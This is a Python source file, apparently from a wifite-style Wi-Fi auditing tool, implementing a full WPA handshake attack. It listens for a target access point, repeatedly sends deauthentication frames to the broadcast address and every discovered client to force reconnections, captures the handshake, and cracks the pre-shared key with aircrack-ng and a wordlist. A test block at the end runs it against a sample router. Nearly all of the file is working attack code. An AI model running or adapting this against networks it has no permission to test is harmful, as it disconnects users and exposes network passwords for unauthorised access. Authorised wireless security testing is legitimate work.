#!/usr/bin/env python
# -*- coding: utf-8 -*-

from masai.model.attack import Attack
from masai.model.crackresult import CrackResult
from masai.tools.aircrack import Aircrack
from masai.tools.airodump import Airodump
from masai.tools.aireplay import Aireplay
from masai.config import Configuration
from masai.utils.process import Process
from masai.utils.timer import Timer
from masai.model.handshake import Handshake
# from ..model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy

class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        '''Initiates full WPA handshake capture attack.'''

        # Skip if target is not WPS
        if Configuration.wps_only and self.target.wps == False:
            print('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}' % self.target.essid)
            self.success = False
            return self.success

        # Skip if user only wants to run PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Capture the handshake (or use an old one)
        handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            crack_result = {'bssid': self.target.bssid, 
                                'essid': self.target.essid,
                                'channel': self.target.channel,
                                'status': 'failure',
                                'key': None }
            result = CrackResult()
            result.set_result(attack_type='wpa', crack_result=crack_result)
            self.success = False
            return result

        # Analyze handshake
        print('\n{+} analysis of captured handshake file:')
        handshake.analyze()

        # Check wordlist
        if Configuration.wordlist is None:
            print('{!} {O}Not cracking handshake because' +
                     ' wordlist ({R}--dict{O}) is not set')
            self.success = False
            crack_result = {'bssid': self.target.bssid, 
                                'essid': self.target.essid,
                                'channel': self.target.channel,
                                'status': 'failure',
                                'key': None }
            result = CrackResult()
            result.set_result(attack_type='wpa', crack_result=crack_result)
            return result

        elif not os.path.exists(Configuration.wordlist):
            print('{!} {O}Not cracking handshake because' +
                     ' wordlist {R}%s{O} was not found' % Configuration.wordlist)
            self.success = False
            crack_result = {'bssid': self.target.bssid, 
                                'essid': self.target.essid,
                                'channel': self.target.channel,
                                'status': 'failure',
                                'key': None }
            result = CrackResult()
            result.set_result(attack_type='wpa', crack_result=crack_result)
            return result

        print('\n{+} {C}Cracking WPA Handshake:{W} Running {C}aircrack-ng{W} with' +
                ' {C}%s{W} wordlist' % os.path.split(Configuration.wordlist)[-1])

        # Crack it
        key = Aircrack.crack_handshake(handshake, show_command=False)
        if key is None:
            print('{!} {R}Failed to crack handshake: {O}%s{R} did not contain password{W}' % Configuration.wordlist.split(os.sep)[-1])
            crack_result = {'bssid': self.target.bssid, 
                                'essid': self.target.essid,
                                'channel': self.target.channel,
                                'status': 'failure',
                                'key': None }
            result = CrackResult()
            result.set_result(attack_type='wpa', crack_result=crack_result)
            self.success = False
        else:
            print('{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\n' % key)
            # self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
            # self.crack_result.dump()
            crack_result = {'bssid': handshake.bssid, 
                                'essid': handshake.essid,
                                'channel': self.target.channel,
                                'status': 'success',
                                'key': key }
            result = CrackResult()
            result.set_result(attack_type='wpa', crack_result=crack_result)
            self.success = True
        return result


    def capture_handshake(self):
        '''Returns captured or stored handshake, otherwise None.'''
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            print('WPA', self.target.essid, 'Handshake capture', 'Waiting for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            self.clients = []
            # Try to load existing handshake
            if Configuration.ignore_old_handshakes == False:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    print('WPA', self.target.essid, 'Handshake capture', 'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    print('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                print('WPA',
                        airodump_target.essid,
                        'Handshake capture',
                        'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (len(self.clients), deauth_timer, timeout_timer))

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    print('WPA',
                            airodump_target.essid,
                            'Handshake capture',
                            '{G}Captured handshake{W}')
                    print()
                    break

                # There is no handshake
                handshake = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # Look for new clients
                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        print('WPA',
                                airodump_target.essid,
                                'Handshake capture',
                                'Discovered new client: {G}%s{W}' % client.station)
                        print()
                        self.clients.append(client.station)

                # Send deauth to a client or broadcast
                if deauth_timer.ended():
                    self.deauth(airodump_target)
                    # Restart timer
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())
                continue # Handshake listen+deauth loop

        if handshake is None:
            # No handshake, attack failed.
            print('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (Configuration.wpa_attack_timeout))
            return handshake
        else:
            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)
            return handshake

    def load_handshake(self, bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = '\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile('handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    def save_handshake(self, handshake):
        '''
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        '''
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            print('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
            print('{G}saved{W}')
        else:
            print('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
            print('{G}saved{W}')

        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename


    def deauth(self, target):
        '''
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        '''
        if Configuration.no_deauth: return

        for _, client in enumerate([None] + self.clients):
            if client is None:
                target_name = '*broadcast*'
            else:
                target_name = client
            print('WPA',
                    target.essid,
                    'Handshake capture',
                    'Deauthing {O}%s{W}' % target_name)
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)

if __name__ == '__main__':
    Configuration.initialize(True)
    from masai.model.router import Router
    fields = '0C:80:63:C2:BB:B6, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Router(fields)
    Configuration.wordlist = './wordlist.txt'
    # print(Configuration.wordlist)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        print('')
        pass
    Configuration.exit_gracefully(0)